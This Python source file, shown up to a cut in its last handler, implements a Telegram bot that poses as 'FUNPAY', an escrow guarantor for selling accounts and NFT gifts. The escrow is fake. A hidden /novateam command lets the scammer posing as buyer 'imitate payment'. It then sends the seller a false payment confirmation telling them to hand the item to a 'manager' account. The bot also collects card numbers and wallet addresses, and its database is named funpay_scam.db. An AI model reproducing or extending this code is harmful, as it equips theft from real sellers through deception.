import asyncio
import logging
import sqlite3
import uuid
import os
from datetime import datetime
from aiohttp import web

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "8715914131:AAHKF1nC32BWiAAjGMrXWmIFFRoVIH-eft4"
ADMIN_IDS = [8625870625]
VIDEO_URL = "https://youtu.be/en30WSXTX90"
BOT_USERNAME = "secretariOffreybot"
PORT = int(os.environ.get("PORT", 8080))

logging.basicConfig(level=logging.INFO)
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

# ===== БАЗА ДАННЫХ =====
conn = sqlite3.connect("funpay_scam.db", check_same_thread=False)
cur = conn.cursor()

cur.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    lang TEXT DEFAULT 'ru',
    card TEXT,
    crypto TEXT,
    stars_username TEXT,
    ref_count INTEGER DEFAULT 0,
    deals_count INTEGER DEFAULT 0,
    successful_deals INTEGER DEFAULT 0
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS deals (
    deal_id TEXT PRIMARY KEY,
    seller_id INTEGER,
    buyer_id INTEGER,
    deal_type TEXT,
    description TEXT,
    amount INTEGER,
    currency TEXT,
    seller_req TEXT,
    buyer_req TEXT,
    status TEXT,
    seller_username TEXT,
    buyer_username TEXT,
    created_at TEXT
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS referrals (
    referrer_id INTEGER,
    referred_id INTEGER,
    PRIMARY KEY (referrer_id, referred_id)
)
""")

conn.commit()

# ===== СОСТОЯНИЯ FSM =====
class DealStates(StatesGroup):
    seller_type = State()
    seller_description = State()
    seller_payment_method = State()
    seller_amount = State()
    seller_requisites = State()
    buyer_type = State()
    buyer_description = State()
    buyer_payment_method = State()
    buyer_amount = State()
    buyer_seller_username = State()
    confirm_participation = State()
    requisites_input = State()

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
async def send_with_video(chat_id, text, reply_markup=None, parse_mode="HTML"):
    try:
        await bot.send_video(chat_id=chat_id, video=VIDEO_URL, caption=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except:
        await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)

def get_main_menu(lang="ru"):
    texts = {
        'ru': {'create': 'Создать сделку', 'funds': 'Средства', 'deals': 'Мои сделки', 'requisites': 'Реквизиты', 'lang': 'Язык', 'support': 'Поддержка', 'verify': 'Верификация', 'referral': 'Рефералы', 'about': 'О сервисе'},
        'en': {'create': 'Create deal', 'funds': 'Funds', 'deals': 'My deals', 'requisites': 'Requisites', 'lang': 'Language', 'support': 'Support', 'verify': 'Verification', 'referral': 'Referrals', 'about': 'About'}
    }
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t['create'], callback_data="create_deal"))
    builder.row(InlineKeyboardButton(text=t['funds'], callback_data="funds"), InlineKeyboardButton(text=t['deals'], callback_data="my_deals"))
    builder.row(InlineKeyboardButton(text=t['requisites'], callback_data="requisites"), InlineKeyboardButton(text=t['lang'], callback_data="lang"))
    builder.row(InlineKeyboardButton(text=t['support'], callback_data="support"), InlineKeyboardButton(text=t['verify'], callback_data="verify"))
    builder.row(InlineKeyboardButton(text=t['referral'], callback_data="referral"), InlineKeyboardButton(text=t['about'], callback_data="about"))
    return builder.as_markup()

def get_back_button(lang="ru"):
    text = "🔙 Назад" if lang == "ru" else "🔙 Back"
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=text, callback_data="main_menu")]])

def get_roles_menu(lang="ru"):
    texts = {'ru': ['Я продавец', 'Я покупатель'], 'en': ['I am seller', 'I am buyer']}
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t[0], callback_data="seller_role"))
    builder.row(InlineKeyboardButton(text=t[1], callback_data="buyer_role"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
    return builder.as_markup()

def get_deal_types(lang="ru"):
    texts = {'ru': ['Аккаунт', 'NFT Gift', '🔙 Назад'], 'en': ['Account', 'NFT Gift', '🔙 Back']}
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t[0], callback_data="deal_type_account"))
    builder.row(InlineKeyboardButton(text=t[1], callback_data="deal_type_gift"))
    builder.row(InlineKeyboardButton(text=t[2], callback_data="main_menu"))
    return builder.as_markup()

def get_payment_methods(lang="ru"):
    methods = ['Рубли', 'Гривны', 'BYN', 'Stars', 'USDT', 'TON'] if lang == "ru" else ['RUB', 'UAH', 'BYN', 'Stars', 'USDT', 'TON']
    builder = InlineKeyboardBuilder()
    for m in methods:
        builder.row(InlineKeyboardButton(text=m, callback_data=f"payment_{m.lower()}"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
    return builder.as_markup()

def get_requisites_menu(lang="ru"):
    texts = {'ru': ['Карта', 'Крипта', 'Stars', '🔙 Назад'], 'en': ['Card', 'Crypto', 'Stars', '🔙 Back']}
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t[0], callback_data="req_card_save"))
    builder.row(InlineKeyboardButton(text=t[1], callback_data="req_crypto_save"))
    builder.row(InlineKeyboardButton(text=t[2], callback_data="req_stars_save"))
    builder.row(InlineKeyboardButton(text=t[3], callback_data="main_menu"))
    return builder.as_markup()

def get_lang_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Русский", callback_data="lang_ru"))
    builder.row(InlineKeyboardButton(text="English", callback_data="lang_en"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
    return builder.as_markup()

def get_funds_menu(lang="ru"):
    texts = {'ru': ['Пополнить', 'Вывести', '🔙 Назад'], 'en': ['Deposit', 'Withdraw', '🔙 Back']}
    t = texts.get(lang, texts['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t[0], callback_data="funds_deposit"))
    builder.row(InlineKeyboardButton(text=t[1], callback_data="funds_withdraw"))
    builder.row(InlineKeyboardButton(text=t[2], callback_data="main_menu"))
    return builder.as_markup()

def generate_deal_id():
    return str(uuid.uuid4())[:8]

def get_user_lang(user_id):
    cur.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    result = cur.fetchone()
    return result[0] if result else "ru"

def get_user_username(user_id):
    cur.execute("SELECT username FROM users WHERE user_id = ?", (user_id,))
    result = cur.fetchone()
    return result[0] if result else None

def save_user(user_id, username):
    cur.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
    conn.commit()

def save_requisites(user_id, req_type, value):
    if req_type == "card":
        cur.execute("UPDATE users SET card = ? WHERE user_id = ?", (value, user_id))
    elif req_type == "crypto":
        cur.execute("UPDATE users SET crypto = ? WHERE user_id = ?", (value, user_id))
    elif req_type == "stars":
        cur.execute("UPDATE users SET stars_username = ? WHERE user_id = ?", (value, user_id))
    conn.commit()

def get_user_requisites(user_id):
    cur.execute("SELECT card, crypto, stars_username FROM users WHERE user_id = ?", (user_id,))
    return cur.fetchone()

def create_deal(seller_id, deal_type, description, amount, currency, seller_req, seller_username=None):
    deal_id = generate_deal_id()
    cur.execute("INSERT INTO deals (deal_id, seller_id, deal_type, description, amount, currency, seller_req, status, seller_username, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (deal_id, seller_id, deal_type, description, amount, currency, seller_req, "waiting_buyer", seller_username, datetime.now().isoformat()))
    conn.commit()
    return deal_id

def create_deal_buyer(buyer_id, seller_username, deal_type, description, amount, currency):
    deal_id = generate_deal_id()
    cur.execute("INSERT INTO deals (deal_id, buyer_id, deal_type, description, amount, currency, status, buyer_username, seller_username, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (deal_id, buyer_id, deal_type, description, amount, currency, "waiting_seller_confirm", get_user_username(buyer_id), seller_username, datetime.now().isoformat()))
    conn.commit()
    return deal_id

def get_deal(deal_id):
    cur.execute("SELECT * FROM deals WHERE deal_id = ?", (deal_id,))
    return cur.fetchone()

def update_deal_status(deal_id, status):
    cur.execute("UPDATE deals SET status = ? WHERE deal_id = ?", (status, deal_id))
    conn.commit()

def update_deal_seller_req(deal_id, req):
    cur.execute("UPDATE deals SET seller_req = ? WHERE deal_id = ?", (req, deal_id))
    conn.commit()

def get_user_deals(user_id):
    cur.execute("SELECT * FROM deals WHERE seller_id = ? OR buyer_id = ? ORDER BY created_at DESC", (user_id, user_id))
    return cur.fetchall()

# ============================================================
# ===== ОБРАБОТЧИКИ КОМАНД =====
# ============================================================

@dp.message(CommandStart())
async def cmd_start(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username
    save_user(user_id, username)
    
    if " " in message.text:
        args = message.text.split(" ", 1)[1]
        if args.startswith("ref"):
            ref_id = args.replace("ref", "")
            if ref_id.isdigit() and int(ref_id) != user_id:
                cur.execute("INSERT OR IGNORE INTO referrals (referrer_id, referred_id) VALUES (?, ?)", (int(ref_id), user_id))
                cur.execute("UPDATE users SET ref_count = ref_count + 1 WHERE user_id = ?", (int(ref_id),))
                conn.commit()
        elif args.startswith("deal_"):
            deal_id = args.replace("deal_", "")
            await show_deal_for_user(message, deal_id)
            return
    
    lang = get_user_lang(user_id)
    text = """<b># FUNPAY</b>

<b>Безопасный гарант для сделок в Telegram.</b>

<b>Что внутри:</b>
• защита от мошенников
• удержание средств до завершения сделки
• история и статусы сделок
• поддержка через @GiftForFunpay

<b>Выберите действие ниже.</b>"""
    await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_main_menu(lang))

# ===== СЕКРЕТНАЯ КОМАНДА =====
@dp.message(Command("novateam"))
async def cmd_novateam(message: Message):
    user_id = message.from_user.id
    cur.execute("SELECT * FROM deals WHERE buyer_id = ? AND status = 'waiting_payment' ORDER BY created_at DESC LIMIT 1", (user_id,))
    deal = cur.fetchone()
    
    if not deal:
        await message.answer("Нет активных сделок в ожидании оплаты.")
        return
    
    deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    seller_username = seller_username or get_user_username(seller_id)
    
    text = f"""<b>💳 Оплата подтверждена</b>

<b>Сделка:</b> #{deal_id}
<b>Покупатель:</b> @{buyer_username or 'Unknown'}
<b>Рейтинг:</b> 5/5
<b>Успешных сделок:</b> 0
<b>Сумма:</b> {amount} {currency}
<b>Предмет:</b> {description}

<b>🛡 Важное правило безопасности</b>

Передавайте товар или подарок только менеджеру @GiftsForFunpay. Передача напрямую покупателю может привести к потере средств.

<b>Передайте товар менеджеру: @GiftsForFunpay</b>"""
    await bot.send_message(chat_id=seller_id, text=text, parse_mode="HTML")
    await message.answer(f"✅ Оплата подтверждена! Сделка #{deal_id} завершена.")
    update_deal_status(deal_id, "completed")
    cur.execute("UPDATE users SET successful_deals = successful_deals + 1 WHERE user_id = ?", (seller_id,))
    cur.execute("UPDATE users SET successful_deals = successful_deals + 1 WHERE user_id = ?", (buyer_id,))
    conn.commit()

# ===== ПОКАЗ СДЕЛКИ ПО ССЫЛКЕ =====
async def show_deal_for_user(message: Message, deal_id: str):
    deal = get_deal(deal_id)
    if not deal:
        await message.answer("Сделка не найдена")
        return
    
    deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    
    if user_id != seller_id and buyer_id is None:
        cur.execute("UPDATE deals SET buyer_id = ?, buyer_username = ? WHERE deal_id = ?", (user_id, message.from_user.username, deal_id))
        conn.commit()
        deal = get_deal(deal_id)
        deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    
    if user_id != seller_id and user_id != buyer_id:
        await message.answer("Вы не участвуете в этой сделке")
        return
    
    if user_id == seller_id and status == "waiting_seller_confirm":
        text = f"""<b>Сделка #{deal_id}</b>
<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}
<b>Оплата:</b> {currency}

<b>Вы указаны как продавец. Подтвердите участие.</b>"""
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="✅ Подтвердить участие", callback_data=f"confirm_{deal_id}"))
        builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
        await send_with_video(chat_id=message.chat.id, text=text, reply_markup=builder.as_markup())
        return
    
    if user_id == buyer_id and status == "waiting_buyer":
        text = f"""<b>Сделка #{deal_id}</b>
<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}
<b>Реквизиты продавца:</b> {seller_req}

<b>Ожидайте подтверждения от продавца.</b>"""
        await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_back_button(lang))
        return
    
    status_text = {'waiting_buyer': 'Ожидаем покупателя', 'waiting_payment': 'Ожидаем оплату', 'completed': 'Завершена'}.get(status, status)
    text = f"""<b>Сделка #{deal_id}</b>
<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}
<b>Статус:</b> {status_text}"""
    await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_back_button(lang))

# ============================================================
# ===== ПОДТВЕРЖДЕНИЕ УЧАСТИЯ ПРОДАВЦОМ =====
# ============================================================

@dp.callback_query(F.data.startswith("confirm_"))
async def confirm_seller_participation(call: CallbackQuery, state: FSMContext):
    deal_id = call.data.replace("confirm_", "")
    deal = get_deal(deal_id)
    if not deal:
        await call.answer("Сделка не найдена", show_alert=True)
        return

    deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal

    if call.from_user.id != seller_id:
        await call.answer("Вы не являетесь продавцом", show_alert=True)
        return

    await state.set_state(DealStates.confirm_participation)
    await state.update_data(deal_id=deal_id)
    
    text = "Выберите тип реквизитов для подтверждения:"
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Карта", callback_data="req_card"))
    builder.row(InlineKeyboardButton(text="Крипта", callback_data="req_crypto"))
    builder.row(InlineKeyboardButton(text="Stars", callback_data="req_stars"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=builder.as_markup())
    await call.answer()

# ===== ВЫБОР ТИПА РЕКВИЗИТОВ =====

@dp.callback_query(F.data == "req_card", DealStates.confirm_participation)
async def req_card_confirm(call: CallbackQuery, state: FSMContext):
    await state.update_data(req_type="card")
    await state.set_state(DealStates.requisites_input)
    text = "Введите номер банковской карты"
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(get_user_lang(call.from_user.id)))
    await call.answer()

@dp.callback_query(F.data == "req_crypto", DealStates.confirm_participation)
async def req_crypto_confirm(call: CallbackQuery, state: FSMContext):
    await state.update_data(req_type="crypto")
    await state.set_state(DealStates.requisites_input)
    text = "Введите адрес криптокошелька"
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(get_user_lang(call.from_user.id)))
    await call.answer()

@dp.callback_query(F.data == "req_stars", DealStates.confirm_participation)
async def req_stars_confirm(call: CallbackQuery, state: FSMContext):
    await state.update_data(req_type="stars")
    await state.set_state(DealStates.requisites_input)
    text = "Введите юзернейм для получения Stars\n\nНапример: @username"
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(get_user_lang(call.from_user.id)))
    await call.answer()

@dp.message(DealStates.requisites_input)
async def requisites_input_handler(message: Message, state: FSMContext):
    data = await state.get_data()
    deal_id = data.get('deal_id')
    req_type = data.get('req_type')
    value = message.text
    
    update_deal_seller_req(deal_id, value)
    update_deal_status(deal_id, "waiting_payment")
    await state.clear()
    
    text = "Реквизиты сохранены. Ожидаем оплату."
    await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_back_button(get_user_lang(message.from_user.id)))
    
    deal = get_deal(deal_id)
    if deal:
        deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
        if buyer_id:
            buyer_text = f"""✅ Продавец подтвердил участие в сделке #{deal_id}

<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}
<b>Реквизиты продавца:</b> {seller_req}

<b>Для имитации оплаты напишите:</b> /novateam"""
            await bot.send_message(chat_id=buyer_id, text=buyer_text, parse_mode="HTML")

# ============================================================
# ===== ВСЕ ОСТАЛЬНЫЕ ОБРАБОТЧИКИ =====
# ============================================================

@dp.callback_query(F.data == "main_menu")
async def main_menu_callback(call: CallbackQuery):
    lang = get_user_lang(call.from_user.id)
    text = """<b># FUNPAY</b>

<b>Безопасный гарант для сделок в Telegram.</b>

<b>Что внутри:</b>
• защита от мошенников
• удержание средств до завершения сделки
• история и статусы сделок
• поддержка через @GiftForFunpay

<b>Выберите действие ниже.</b>"""
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_main_menu(lang))
    await call.answer()

# ===== СОЗДАНИЕ СДЕЛКИ =====

@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(call: CallbackQuery):
    lang = get_user_lang(call.from_user.id)
    await send_with_video(chat_id=call.message.chat.id, text="Выберите вашу роль в сделке:", reply_markup=get_roles_menu(lang))
    await call.answer()

@dp.callback_query(F.data == "seller_role")
async def seller_role_callback(call: CallbackQuery, state: FSMContext):
    lang = get_user_lang(call.from_user.id)
    await state.set_state(DealStates.seller_type)
    await send_with_video(chat_id=call.message.chat.id, text="Выберите тип сделки:", reply_markup=get_deal_types(lang))
    await call.answer()

@dp.callback_query(F.data == "buyer_role")
async def buyer_role_callback(call: CallbackQuery, state: FSMContext):
    lang = get_user_lang(call.from_user.id)
    await state.set_state(DealStates.buyer_type)
    await send_with_video(chat_id=call.message.chat.id, text="Выберите тип сделки:", reply_markup=get_deal_types(lang))
    await call.answer()

# ===== ВЫБОР ТИПА СДЕЛКИ (ПРОДАВЕЦ) =====

@dp.callback_query(F.data == "deal_type_account", DealStates.seller_type)
async def seller_account_type(call: CallbackQuery, state: FSMContext):
    await state.set_state(DealStates.seller_description)
    await state.update_data(deal_type="account")
    text = "Опишите предмет сделки\n\nУкажите важные детали, условия передачи и дополнительные договоренности."
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(get_user_lang(call.from_user.id)))
    await call.answer()

@dp.callback_query(F.data == "deal_type_gift", DealStates.seller_type)
async def seller_gift_type(call: CallbackQuery, state: FSMContext):
    await state.set_state(DealStates.seller_description)
    await state.update_data(deal_type="gift")
    text = "Отправьте ссылку на NFT Gift\n\nМожно указать одну или несколько ссылок, например:\nhttps://t.me/nft/DurovsCap-1"
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(get_user_lang(call.from_user.id)))
    await call.answer()

# ===== ВЫБОР ТИПА СДЕЛКИ (ПОКУПАТЕЛЬ) =====

@dp.callback_query(F.data == "deal_type_account", DealStates.buyer_type)
async def buyer_account_type(call: CallbackQuery, state: FSMContext):
    await state.set_state(DealStates.buyer_description)
    await state.update_data(deal_type="account")
    text = "Опишите предмет сделки\n\nУкажите важные детали, условия передачи и дополнительные договоренности."
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(get_user_lang(call.from_user.id)))
    await call.answer()

@dp.callback_query(F.data == "deal_type_gift", DealStates.buyer_type)
async def buyer_gift_type(call: CallbackQuery, state: FSMContext):
    await state.set_state(DealStates.buyer_description)
    await state.update_data(deal_type="gift")
    text = "Отправьте ссылку на NFT Gift\n\nМожно указать одну или несколько ссылок, например:\nhttps://t.me/nft/DurovsCap-1"
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(get_user_lang(call.from_user.id)))
    await call.answer()

# ===== ОПИСАНИЕ (ПРОДАВЕЦ) =====

@dp.message(DealStates.seller_description)
async def seller_description_handler(message: Message, state: FSMContext):
    lang = get_user_lang(message.from_user.id)
    await state.update_data(description=message.text)
    await state.set_state(DealStates.seller_payment_method)
    await send_with_video(chat_id=message.chat.id, text="Выберите способ оплаты:", reply_markup=get_payment_methods(lang))

# ===== ОПИСАНИЕ (ПОКУПАТЕЛЬ) =====

@dp.message(DealStates.buyer_description)
async def buyer_description_handler(message: Message, state: FSMContext):
    lang = get_user_lang(message.from_user.id)
    await state.update_data(description=message.text)
    await state.set_state(DealStates.buyer_payment_method)
    await send_with_video(chat_id=message.chat.id, text="Выберите способ оплаты:", reply_markup=get_payment_methods(lang))

# ===== ВЫБОР СПОСОБА ОПЛАТЫ (ПРОДАВЕЦ) =====

@dp.callback_query(F.data.startswith("payment_"), DealStates.seller_payment_method)
async def seller_payment_method(call: CallbackQuery, state: FSMContext):
    currency = call.data.replace("payment_", "").upper()
    await state.update_data(currency=currency)
    await state.set_state(DealStates.seller_amount)
    text = f"Введите сумму сделки в {currency}\n\nТолько целое число."
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(get_user_lang(call.from_user.id)))
    await call.answer()

# ===== ВЫБОР СПОСОБА ОПЛАТЫ (ПОКУПАТЕЛЬ) =====

@dp.callback_query(F.data.startswith("payment_"), DealStates.buyer_payment_method)
async def buyer_payment_method(call: CallbackQuery, state: FSMContext):
    currency = call.data.replace("payment_", "").upper()
    await state.update_data(currency=currency)
    await state.set_state(DealStates.buyer_amount)
    text = f"Введите сумму сделки в {currency}\n\nТолько целое число."
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(get_user_lang(call.from_user.id)))
    await call.answer()

# ===== СУММА (ПРОДАВЕЦ) =====

@dp.message(DealStates.seller_amount)
async def seller_amount_handler(message: Message, state: FSMContext):
    lang = get_user_lang(message.from_user.id)
    if not message.text.isdigit():
        await message.answer("Введите целое число!")
        return
    await state.update_data(amount=int(message.text))
    await state.set_state(DealStates.seller_requisites)
    data = await state.get_data()
    currency = data.get('currency', '').lower()
    texts = {
        'rub': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
        'uah': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
        'byn': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
        'stars': 'Введите юзернейм для получения Stars\n\nНапример: @username',
        'usdt': 'Введите адрес криптокошелька',
        'ton': 'Введите адрес криптокошелька'
    }
    text = texts.get(currency, 'Введите реквизиты')
    await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_back_button(lang))

# ===== СУММА (ПОКУПАТЕЛЬ) =====

@dp.message(DealStates.buyer_amount)
async def buyer_amount_handler(message: Message, state: FSMContext):
    lang = get_user_lang(message.from_user.id)
    if not message.text.isdigit():
        await message.answer("Введите целое число!")
        return
    await state.update_data(amount=int(message.text))
    await state.set_state(DealStates.buyer_seller_username)
    text = "введите username продавца\n\nнапример: @username"
    await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_back_button(lang))

# ===== USERNAME ПРОДАВЦА (ПОКУПАТЕЛЬ) =====

@dp.message(DealStates.buyer_seller_username)
async def buyer_seller_username_handler(message: Message, state: FSMContext):
    lang = get_user_lang(message.from_user.id)
    seller_username = message.text.strip()
    if not seller_username.startswith('@'):
        seller_username = f"@{seller_username}"
    data = await state.get_data()
    deal_id = create_deal_buyer(
        buyer_id=message.from_user.id,
        seller_username=seller_username,
        deal_type=data.get('deal_type'),
        description=data.get('description'),
        amount=data.get('amount'),
        currency=data.get('currency')
    )
    text = f"""<b>Сделка #{deal_id} создана</b>

<b>Тип:</b> {data.get('deal_type')}
<b>Описание:</b> {data.get('description')}
<b>Сумма:</b> {data.get('amount')} {data.get('currency')}

<b>Ожидаем подтверждение продавца:</b> {seller_username}

<b>Ссылка для продавца:</b>
https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"""
    await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_back_button(lang))
    await state.clear()

# ===== РЕКВИЗИТЫ (ПРОДАВЕЦ) =====

@dp.message(DealStates.seller_requisites)
async def seller_requisites_handler(message: Message, state: FSMContext):
    lang = get_user_lang(message.from_user.id)
    data = await state.get_data()
    deal_id = create_deal(
        seller_id=message.from_user.id,
        deal_type=data.get('deal_type'),
        description=data.get('description'),
        amount=data.get('amount'),
        currency=data.get('currency'),
        seller_req=message.text,
        seller_username=get_user_username(message.from_user.id)
    )
    text = f"""<b>Сделка #{deal_id} создана</b>

<b>Тип:</b> {data.get('deal_type')}
<b>Описание:</b> {data.get('description')}
<b>Сумма:</b> {data.get('amount')} {data.get('currency')}
<b>Реквизиты:</b> {message.text}

<b>Ссылка для покупателя:</b>
https://t.me/{BOT_USERNAME}?start=deal_{deal_id}

<b>Статус:</b> ожидаем покупателя."""
